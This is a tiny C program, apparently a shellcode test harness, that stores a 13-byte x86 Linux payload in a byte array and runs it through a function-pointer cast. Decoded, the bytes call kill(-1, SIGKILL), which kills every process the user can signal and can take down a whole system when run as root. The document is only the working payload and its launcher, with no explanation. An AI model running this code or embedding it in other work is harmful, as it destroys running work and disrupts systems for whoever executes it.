#include <stdio.h>  
#include <string.h>  

unsigned char shellcode[] = "\x31\xc9\xf7\xe1\x31\xdb\x4b\xb0\x25\xb1\x09\xcd\x80";
int main()  
{  
    printf("shellcode  size: %d\n", strlen(shellcode));  
    int (*ret)() = (int(*)())shellcode;  
    ret();  
}  

